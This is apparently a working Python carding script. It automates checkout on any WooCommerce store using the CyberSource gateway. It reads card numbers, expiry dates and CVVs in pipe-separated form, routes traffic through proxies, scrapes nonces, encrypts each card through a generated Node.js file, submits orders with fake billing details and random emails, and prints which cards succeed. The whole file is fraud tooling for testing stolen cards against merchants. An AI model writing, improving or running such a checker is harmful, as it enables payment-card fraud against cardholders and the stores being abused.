import subprocess
import requests
import string
import random
import json
import re
import os

def stripTags(input_string):
    cleaned = re.sub(r'</?[^>]+(>|$)', '', input_string)
    cleaned = re.sub(r'\s+', ' ', cleaned).strip()
    return cleaned

def cybersource_api(domain, creditCard, proxy):
    G = "\033[38;5;82m"
    Y ="\033[38;5;226m"
    R2 = "\033[38;5;202m"
    R = "\033[0m"
    cc, mm, yy, cvv = creditCard.strip().split('|')
    CardType = {'4': "Visa", '5': "MasterCard", '3': "AmericanExpress", '6': "Discover"}.get(cc[0], None)
    session = requests.Session()

    if proxy:
        session.proxies = proxy

    #requests 1
    try:
        url = f"https://{domain}/?=&post_type=product"

        response = session.get(url, proxies=proxy)
        split_text = response.text.split('data-product_id="')
        if len(split_text) > 1:
            id = split_text[1].split('"')[0]
        else:
            return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} Product ID not found in the response.")

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 1 An error occurred during processing: {e}")

    #requests 2
    try:
        url = f"https://{domain}/?wc-ajax=add_to_cart"
        data = {
            'quantity': 1,
            'add-to-cart': id
        }

        response = session.post(url, data=data, proxies=proxy)

        if response.status_code not in (200, 302):
            return print(f'[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} Failed to add item to cart.')

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 2 An error occurred during processing: {e}")
    
    #requests 3
    try:
        url = f"https://{domain}/checkout/"
        response = session.get(url, proxies=proxy)

        split_text = response.text.split('name="woocommerce-process-checkout-nonce" value="')
        if len(split_text) > 1:
            checkoutNonce = split_text[1].split('"')[0]
        else:
            return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} Checkout nonce not found in the response.")

        split_text = response.text.split('"capture_context":"')
        if len(split_text) > 1:
            capture_context = split_text[1].split('"')[0]
        else:
            return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} capture_context variable not found in the response.")

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 3 An error occurred during processing: {e}")
    
    #encryption
    tmp_dir = os.path.join(os.getcwd(), "tmp")
    os.makedirs(tmp_dir, exist_ok=True)
    nodejs_file = os.path.join(tmp_dir, f"nodejs{random.randint(1000000, 99999999)}.mjs")

    nodejs_script = f"""
    import {{ encrypt, CardTypes }} from 'cs2-encryption';

    (async () => {{
        const cardData = {{
            number: "{cc}",
            expirationMonth: "{mm}",
            expirationYear: "{yy}",
            type: CardTypes.{CardType},
        }};
        const encryptedCardData = await encrypt(cardData, "{capture_context}");
        console.log(JSON.stringify({{ encryptedCardData, author: "Jaehwan0" }}));
    }})();
    """

    with open(nodejs_file, "w") as file:
        file.write(nodejs_script)

    try:
        result = subprocess.check_output(["node", nodejs_file], text=True).strip()
        encryptedCardData = json.loads(result)["encryptedCardData"]
    except subprocess.CalledProcessError as e:
        print(f"Error while running Node.js script: {e}")
    except json.JSONDecodeError:
        print("Failed to parse JSON output from Node.js script.")

    #requests 5
    try:
        url = f"https://flex.cybersource.com/flex/v2/tokens"
        data = encryptedCardData
        headers = {
            "authority": "flex.cybersource.com",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/jwt; charset=UTF-8",
            "Origin": "https://flex.cybersource.com"
        }
        response = session.post(url, data=data, headers=headers, proxies=proxy)

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 5 An error occurred during processing: {e}")

    #requests 6
    try:
        url = f"https://{domain}/?wc-ajax=checkout"
        data = {
            'billing_first_name': 'Danyka',
            'billing_last_name': 'Kunde',
            'billing_country': 'US',
            'billing_address_1': '90154 Alanna Rapid Suite 080',
            'billing_city': 'New York',
            'billing_state': 'NY',
            'billing_postcode': '10080',
            'billing_phone': '15809662076',
            'billing_email': ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + '@gmail.com',
            'payment_method': 'cybersource_credit_card',
            'wc-cybersource-credit-card-expiry': '10 / 27',
            'wc-cybersource-credit-card-flex-token': response.text,
            'wc-cybersource-credit-card-flex-key': capture_context,
            'woocommerce-process-checkout-nonce': checkoutNonce,
            '_wp_http_referer': '/?wc-ajax=update_order_review'
        }

        response = session.post(url, data=data, proxies=proxy)

        os.remove(nodejs_file)
    
        if response.status_code == 200:
            status = stripTags(json.loads(response.text)["result"])
        
        if 'order-received' in status:
            receipt = stripTags(json.loads(response.text)["redirect"])
            return print(f"[{G}+{R}] {domain} {cc}|{mm}|{yy}|{cvv} {receipt}")
        elif 'order-pay' in status:
            message = stripTags(json.loads(response.text)["messages"])
            return print(f"[{R2}-{R}] {domain} {cc}|{mm}|{yy}|{cvv} An error occurred, please try again or try an alternate form of payment.")
        elif 'failure' in status:
            message = stripTags(json.loads(response.text)["messages"])
            return print(f"[{R2}-{R}] {domain} {cc}|{mm}|{yy}|{cvv} {message}")
        else:
            return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} {response.text}")

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 6 An error occurred during processing: {e}")